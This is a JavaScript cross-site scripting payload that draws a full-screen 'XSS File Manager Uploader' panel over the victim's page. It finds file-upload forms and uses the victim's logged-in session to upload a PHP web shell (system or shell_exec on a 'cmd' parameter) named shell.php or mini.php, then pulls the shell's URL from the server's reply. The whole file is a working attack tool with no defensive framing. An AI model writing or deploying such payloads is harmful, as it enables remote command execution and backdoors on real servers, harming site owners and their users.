document.write('<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1e1e1e;color:#00ff00;z-index:999999;padding:20px;font-family:monospace;">');
document.write('<h1>📁 XSS File Manager Uploader</h1>');
document.write('<div><button onclick="scanForms()">🔍 Scan Forms</button></div>');
document.write('<div><input id="upUrl" placeholder="Upload URL" value="/upload.php"></div>');
document.write('<div><input id="upField" placeholder="Field name" value="file"></div>');
document.write('<div><select id="upType"><option value="php">PHP File Manager</option><option value="mini">Mini PHP</option></select></div>');
document.write('<div><button onclick="uploadFile()">🚀 Upload</button></div>');
document.write('<div id="upStatus" style="background:#000;padding:10px;margin-top:10px;">Ready</div>');
document.write('</div>');

// Functions
window.scanForms = function() {
    let results = 'Scanning...<br>';
    document.querySelectorAll('form').forEach(f => {
        const fileInput = f.querySelector('input[type="file"]');
        if(fileInput) results += `✅ Found: ${f.action || 'same page'} (${fileInput.name})<br>`;
    });
    document.getElementById('upStatus').innerHTML = results;
};

window.uploadFile = async function() {
    const url = document.getElementById('upUrl').value;
    const field = document.getElementById('upField').value;
    const type = document.getElementById('upType').value;
    
    let content, name;
    if(type === 'php') {
        content = '<?php system($_GET["cmd"]); ?>';
        name = 'shell.php';
    } else {
        content = '<?php echo shell_exec($_GET["cmd"]); ?>';
        name = 'mini.php';
    }
    
    const fd = new FormData();
    const blob = new Blob([content], {type:'application/x-php'});
    const file = new File([blob], name, {type:'application/x-php'});
    fd.append(field, file);
    
    const status = document.getElementById('upStatus');
    status.innerHTML = 'Uploading...<br>';
    
    try {
        const r = await fetch(url, {method:'POST', body:fd, credentials:'include'});
        if(r.ok) {
            status.innerHTML += '✅ Success!<br>';
            const t = await r.text();
            const m = t.match(/(https?:\/\/[^\s"']+\.php)/i);
            if(m) status.innerHTML += `📁 ${m[0]}<br>`;
        } else {
            status.innerHTML += `❌ ${r.status}<br>`;
        }
    } catch(e) {
        status.innerHTML += `❌ Error<br>`;
    }
};
